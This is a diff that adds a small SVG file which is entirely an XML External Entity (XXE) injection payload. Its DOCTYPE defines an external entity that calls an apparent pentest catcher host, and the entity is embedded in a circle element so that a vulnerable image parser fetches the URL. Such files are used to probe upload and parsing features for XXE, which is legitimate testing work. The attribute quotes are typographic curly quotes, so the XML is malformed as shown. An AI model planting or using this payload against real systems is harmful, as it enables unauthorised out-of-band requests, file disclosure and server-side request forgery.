@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [  
+   <!ELEMENT svg ANY >
+   <!ENTITY xxe SYSTEM "http://catcher.pentestlabs.co.uk/xxe" >]>
+<svg xmlns=“http://www.w3.org/1999/svg“>
+<circle r=“40“ fill=“red“>&xxe;</circle>
+</svg>
